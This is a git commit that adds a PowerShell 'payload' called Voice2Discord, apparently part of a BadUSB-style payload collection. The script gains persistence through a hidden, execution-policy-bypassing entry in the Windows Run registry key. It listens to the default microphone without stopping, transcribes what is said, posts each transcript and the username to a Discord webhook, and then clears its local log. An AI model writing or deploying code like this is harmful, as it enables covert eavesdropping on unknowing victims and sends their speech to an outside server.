2928ff4aa30c1138085a0e34c923aa277723cfdc
Oscar <oscarrc.web@gmail.com>
2023-07-06 09:20:53 +0200

    [ADD] Voice2Discord

---
+++ payloads/Voice2Discord/script.ps1
@@ -0,0 +1,50 @@
+function Send-Discord {
+	[CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$False)]
+		[string]$text 
+	);
+
+    # $hook = "";
+
+	$Body = @{
+	  "username" = $env:username;
+	  "content" = $text
+	};
+
+	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $hook  -Method Post -Body ($Body | ConvertTo-Json) };
+}
+
+if(($Persistent -eq $true)){
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$hook=' + $hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
+}else{
+    Remove-Item "$env:temp\voicelog.ps1" -Force;
+}
+
+Add-Type -AssemblyName System.Speech;
+$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
+$grammar = New-Object System.Speech.Recognition.DictationGrammar;
+$recognizer.LoadGrammar($grammar);
+$recognizer.SetInputToDefaultAudioDevice();
+
+while ($true) {
+    $result = $recognizer.Recognize();
+    if ($result) {
+        $results = $result.Text;
+        $log = ("$env:tmp\vlog.txt");
+
+        Write-Output $results > $log;
+
+        $text = Get-Content -Path $log -Raw;
+        
+        Send-Discord $text;
+
+        switch -regex ($results) {
+            "\bnote\b" {Start-Process notepad};
+            "\bexit\b" {break};
+        };
+    };
+};
+
+Clear-Content -Path $log;
